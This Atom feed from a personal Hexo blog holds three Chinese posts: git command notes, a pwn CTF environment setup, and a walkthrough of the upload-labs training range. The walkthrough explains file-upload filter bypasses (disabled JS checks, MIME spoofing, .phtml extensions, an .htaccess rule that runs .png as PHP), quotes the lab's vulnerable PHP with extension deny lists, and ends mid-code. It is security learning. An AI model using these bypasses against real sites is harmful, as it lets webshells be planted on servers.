<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Fish</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-02-22T13:38:30.216Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Fish</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>git命令学习</title>
    <link href="http://example.com/42464/"/>
    <id>http://example.com/42464/</id>
    <published>2022-02-22T12:04:30.024Z</published>
    <updated>2022-02-22T13:38:30.216Z</updated>
    
    <content type="html"><![CDATA[<p>记录下git常用命令</p><h3 id="在创建仓库后如何推送到github"><a href="#在创建仓库后如何推送到github" class="headerlink" title="在创建仓库后如何推送到github"></a>在创建仓库后如何推送到github</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br><span class="line">git add README.md</span><br><span class="line">git commit -m &quot;first commit&quot;</span><br><span class="line">git branch -M main</span><br><span class="line">git remote add origin https://github.com/&lt;your github name&gt;/&lt;your resp name&gt;.git</span><br><span class="line">git push -u origin main #第一次推送使用命令</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git pull #更新仓库</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">这两个命令建议在推送一类文件时使用一次</span></span><br><span class="line">git add &lt;file name&gt;</span><br><span class="line">git commit -m &quot;xxxxx&quot; </span><br><span class="line"></span><br><span class="line">git push </span><br></pre></td></tr></table></figure><h3 id="git常用命令"><a href="#git常用命令" class="headerlink" title="git常用命令"></a>git常用命令</h3><p>初始化仓库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><p>修改或者添加文件后进行的操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git add &lt;file name&gt;</span><br><span class="line">git commit -m &quot;xxxxx&quot;</span><br></pre></td></tr></table></figure><p>查看提交日志，查看提交日志可以跟很多参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20220222181630787.png"></p><p>版本回退</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard HEAD^ #回退到HEAD的上一个版本</span><br><span class="line">git reset --hard &lt;commit_hash_id&gt; #回退到任意版本</span><br></pre></td></tr></table></figure><p>查看每一次命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reflog</span><br></pre></td></tr></table></figure><p>git区分存储区和工作区，工作区的东西被修改后应该放到存储区，在修改文件后没有推送到存储区查看状态就会产生一下说明</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status #查看存储区状态</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20220222182545657.png"></p><p>如果已经add到了暂存区使用一下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git restore --staged &lt;file&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20220222183707805.png" alt="image-20220222183707805"></p><p>创建分支，改变分支（switch和checkout都可以用来改变分支，推荐使用checkout）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git chenkout -b &lt;branch name&gt;</span><br><span class="line">git checkout &lt;branch name&gt;</span><br></pre></td></tr></table></figure><p>分支合并</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge &lt;branch name&gt;</span><br></pre></td></tr></table></figure><h3 id="关于分支"><a href="#关于分支" class="headerlink" title="关于分支"></a>关于分支</h3><p><img src="https://gitee.com/f1shf1sh/blogimage/raw/master//img/image-20220222211018273.png"></p><p>每一次提交（commit）都会产生一个节点，创建一个分支就像创建一个新的指针，每一个分支互不影响，比如在dev分支提交（commit）产生的新节点不会影响master分支，如果使用分支合并就将master移动到了dev分支位置</p><h3 id="关于分支冲突"><a href="#关于分支冲突" class="headerlink" title="关于分支冲突"></a>关于分支冲突</h3><p><img src="https://gitee.com/f1shf1sh/blogimage/raw/master//img/image-20220222212933775.png"></p><p>首先创建一个新分支，新分支修改文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b newbranch</span><br></pre></td></tr></table></figure><p>随后切换成master分支，再次修改文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout master</span><br></pre></td></tr></table></figure><p>如果两次修改的文件位置不一样，那么在合并分支时就会将修改的文件合并，但是如果newbranch分支和master分支修改的文件位置一样，那么就会产生分支冲突，需要修改文件从而才能合并分支</p><p>冲突文件大概长这样，&lt;&lt;&lt;&lt;&lt;和&gt;&gt;&gt;&gt;&gt;后面所跟的是分支名，=====上下隔开的是冲突的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD  </span><br><span class="line">branch new hhh</span><br><span class="line">=======</span><br><span class="line">branch feature1</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt; feature1</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;记录下git常用命令&lt;/p&gt;
&lt;h3 id=&quot;在创建仓库后如何推送到github&quot;&gt;&lt;a href=&quot;#在创建仓库后如何推送到github&quot; class=&quot;headerlink&quot; title=&quot;在创建仓库后如何推送到github&quot;&gt;&lt;/a&gt;在创建仓库后如何推送到github</summary>
      
    
    
    
    
    <category term="git" scheme="http://example.com/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>pwn环境搭建</title>
    <link href="http://example.com/11927/"/>
    <id>http://example.com/11927/</id>
    <published>2022-02-07T16:18:50.621Z</published>
    <updated>2022-02-08T16:20:18.716Z</updated>
    
    <content type="html"><![CDATA[<h2 id="使用Linux版本"><a href="#使用Linux版本" class="headerlink" title="使用Linux版本"></a>使用Linux版本</h2><p>ubuntu<a href="https://ubuntu.com/download/desktop/thank-you?version=20.04.3&architecture=amd64">20.04 LTS</a></p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ul><li><p>安装ubuntu</p></li><li><p>vim安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure></li><li><p>更换默认源</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse </span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse </span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse </span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse </span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse </span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse </span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse </span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse </span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse </span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse focal</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure></li><li><p>跟换pip源</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir .pip</span><br><span class="line">vim pip.conf</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure></li><li><p>安装tmux</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install tmux</span><br></pre></td></tr></table></figure></li><li><p>gdb安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gdb</span><br></pre></td></tr></table></figure></li></ul><h3 id="pwntools安装"><a href="#pwntools安装" class="headerlink" title="pwntools安装"></a>pwntools安装</h3><p>需要进入root权限进行安装，否则checksec等工具无法安装成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">pip3 install pwntool</span><br></pre></td></tr></table></figure><h3 id="pwndbg安装"><a href="#pwndbg安装" class="headerlink" title="pwndbg安装"></a>pwndbg安装</h3><p><a href="https://github.com/pwndbg/pwndbg">https://github.com/pwndbg/pwndbg</a></p><h3 id="pwngdb安装"><a href="#pwngdb安装" class="headerlink" title="pwngdb安装"></a>pwngdb安装</h3><p><a href="https://github.com/scwuaptx/Pwngdb">https://github.com/scwuaptx/Pwngdb</a></p><h3 id="tmux-bug解决"><a href="#tmux-bug解决" class="headerlink" title="tmux bug解决"></a>tmux bug解决</h3><p><a href="https://github.com/Gallopsled/pwntools/commit/f7283bf2ebcb978d977ef11b4198bb3e1f9373e3">https://github.com/Gallopsled/pwntools/commit/f7283bf2ebcb978d977ef11b4198bb3e1f9373e3</a></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul><li>patchelf <a href="https://github.com/NixOS/patchelf">https://github.com/NixOS/patchelf</a></li><li>glibc-all-in-one <a href="https://github.com/matrix1001/glibc-all-in-one">https://github.com/matrix1001/glibc-all-in-one</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;使用Linux版本&quot;&gt;&lt;a href=&quot;#使用Linux版本&quot; class=&quot;headerlink&quot; title=&quot;使用Linux版本&quot;&gt;&lt;/a&gt;使用Linux版本&lt;/h2&gt;&lt;p&gt;ubuntu&lt;a href=&quot;https://ubuntu.com/download</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>upload-lab</title>
    <link href="http://example.com/13303/"/>
    <id>http://example.com/13303/</id>
    <published>2022-01-08T05:05:05.630Z</published>
    <updated>2022-01-08T05:05:30.869Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前提知识"><a href="#前提知识" class="headerlink" title="前提知识"></a>前提知识</h1><p><a href="https://segmentfault.com/a/1190000037411957">文件上传知识</a></p><p><a href="https://www.cnblogs.com/mfryf/archive/2012/05/09/2491178.html">php文件上传过程</a></p><h1 id="Less-1-前端禁用JS绕过"><a href="#Less-1-前端禁用JS绕过" class="headerlink" title="Less-1(前端禁用JS绕过)"></a>Less-1(前端禁用JS绕过)</h1><p>前端存在js代码判断文件类型，所以直接浏览器禁用Js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">        <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">        <span class="comment">//提取上传文件的类型</span></span><br><span class="line">        <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">        <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">            alert(errMsg);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后就可以直接上传一句话，注意upload文件夹在网站根目录。</p><h1 id="Less-2（检查文件类型，MIME绕过）"><a href="#Less-2（检查文件类型，MIME绕过）" class="headerlink" title="Less-2（检查文件类型，MIME绕过）"></a>Less-2（检查文件类型，MIME绕过）</h1><p>后端检测文件类型，使用图片马，抓包时将filename的后缀改为.php</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210929234838895.png" alt="抓包截图"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// php源码</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>造成原因：后端只检测了文件的类型但是并没有检测文件后缀，如果抓包修改了文件后缀文件类型仍是图片类型，所以可以造成文件上传漏洞。</p><p>修复方案：在后端添加一个文件后缀检测函数，可以在代码层面避免，但是也会存在服务器解析漏洞不是代码层面能够解决的东西。</p><h1 id="Less-3-服务器对陌生后缀名解析"><a href="#Less-3-服务器对陌生后缀名解析" class="headerlink" title="Less-3(服务器对陌生后缀名解析)"></a>Less-3(服务器对陌生后缀名解析)</h1><p>首先直接上传了php文件不出意外的失败了，又尝试图片马抓包修改后缀发现也失败，应该就像之前说的在后端添加了检测文件后缀的代码，但是没有检测文件头，所以不用在文件头添加幻数。</p><p>想想之前学的一共有两个思路：一个是利用phtml后缀的文件看看能不能过黑名单，还有一个就是利用服务器解析漏洞，但是这个是有条件的，具体条件忘了慢慢尝试。</p><p>能够上传.phtml后缀的文件，但是服务器不能后解析？不知道为什么，抓包的时候发现了这个东西</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210930001343836.png" alt="抓包记录"></p><p>文件名让人给改了，看这个格式估计是改成了时间戳，再次进入upload目录访问这个文件解析成功了，但是蚁剑连不上，我之后有往里面添加了phpinfo()也没有解析出来，实在是奇怪。尝试用另一种方法，看看有没有服务器解析漏洞。都不行，上网搜了搜，发现是apache的配置文件中没有设置可以解析phtml，php5，php3等文件后缀，需要设置一下。</p><p>记录一下，由于docker中的系统是ubuntu的，所以apache的默认安装路径为<code>/etc/apache2</code>，配置文件也不再是<code>httpd.conf</code>而是<code>apache2.conf</code>，然后docker中又不能安装vim，也没有vi????，最后使用命令<code>echo &quot;AddType application/x-httpd-php .php .phtml .phps .php5 .pht&quot; &gt;&gt; apache2.conf</code>，重启container配置成功，php3 php5 phtml后缀文件全部都能解析。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//作者源码</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：第三关要学习的即使绕过黑名单，在实际中黑名单永远比白名单好绕过，一个是不能上传哪些，一个是只能上传哪些，当过滤不严格时可以用phtml，php5，php3，pht等后缀文件上传绕过。</p><h1 id="Less-4-使用-htaccess绕过黑名单"><a href="#Less-4-使用-htaccess绕过黑名单" class="headerlink" title="Less-4(使用.htaccess绕过黑名单)"></a>Less-4(使用.htaccess绕过黑名单)</h1><p>使用.htaccess后文件来绕过，使他可以将其他后缀的文件解析成php文件，后端源码黑名单中过滤了很多东西。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .png     （把.png文件当做.php文件来解析）</span><br></pre></td></tr></table></figure><p>上传上去，然后在上传png后缀的后门</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 源码</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span 